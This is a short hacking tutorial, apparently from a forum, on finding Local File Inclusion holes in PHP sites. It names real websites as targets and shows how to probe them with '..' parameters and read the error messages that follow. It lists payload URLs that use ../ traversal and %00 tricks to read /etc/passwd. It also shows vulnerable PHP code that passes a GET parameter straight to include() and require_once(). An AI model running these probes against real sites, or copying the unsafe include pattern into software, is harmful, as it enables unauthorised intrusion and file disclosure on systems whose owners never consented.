[- How to Find LFI Vulnerability -]

How to Find LFI Vulnerability, Well i use me of adding ..
Example

www.site.com/index.php?p=.. 





Real World Examples:

http://www.jedit.org/index.php?page=..




Warning: main(...html): failed to open stream: No such file or directory in /home/groups/j/je/jedit/htdocs/index.php on line 
 63 
 
Warning: main(): Failed opening '...html' for inclusion (include_path='.:/usr/local/share/pear') in /home/groups/j/je/jedit/htdocs/index. 
php on line 63




This is not Vulnerable,
A Vulnerable should look like

Warning: include() [function.include]: Failed opening '...php' for inclusion (include_path='.:/usr/share/pear') in / 
home/shiner/shiner.com/htdocs/beers/beers-home.php on line 62




include is the code , the script is using for example

 
 
<?php 
$page = $_GET[page]; 
include($page); 
?> 




Should be [function.include]
but

 
<?php 
$page = $_GET[page]; 
require_once($page); 
?> 




should be [function.require_once] or [function.require]

[- Find Example (Real) -]

http://www.crew4sea.com/indexm.php?url=..




Gives us.

Fatal error: require_once() [function.require]: Failed opening required './..' (include_path='.:/:/usr/php/pear' 
) in /indexm.php on line 164




 [b][function.require][/b]




So we know it Vulnerable

if Windows OS, you can just do

http://www.crew4sea.com/indexm.php?url=indexm.php





other try
http://www.crew4sea.com/indexm.php?url=/etc/passwd
http://www.crew4sea.com/indexm.php?url=/etc/passwd%00
http://www.crew4sea.com/indexm.php?url=../etc/passwd
http://www.crew4sea.com/indexm.php?url=../etc/passwd%00

until you get Something.
